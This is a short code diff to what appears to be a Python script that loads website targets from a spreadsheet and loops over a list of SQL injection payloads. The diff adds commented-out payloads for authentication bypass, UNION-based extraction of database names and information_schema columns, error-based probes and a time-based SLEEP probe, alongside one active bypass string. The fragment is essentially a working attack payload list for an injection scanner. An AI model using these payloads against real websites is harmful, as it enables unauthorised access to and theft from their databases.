@@ -7,6 +7,15 @@ df = pd.read_excel('Website.xlsx')
 # List of payloads to try
 payloads = [
     "' OR '1'='1'--",
+     #"' OR '1'='1' /*",
+   # "1' UNION SELECT null, database(), null--",
+    #"1' UNION SELECT table_name, column_name, null FROM information_schema.columns--",
+    #"1'; SELECT 1/0; --",
+    #"1'; SELECT * FROM nonexistent_table; --",
+    #"1' AND 1=1--",
+    #"1' AND 1=2--",
+    #"1' AND SLEEP(5)--"
+    
 ]
 
 # List to store the results
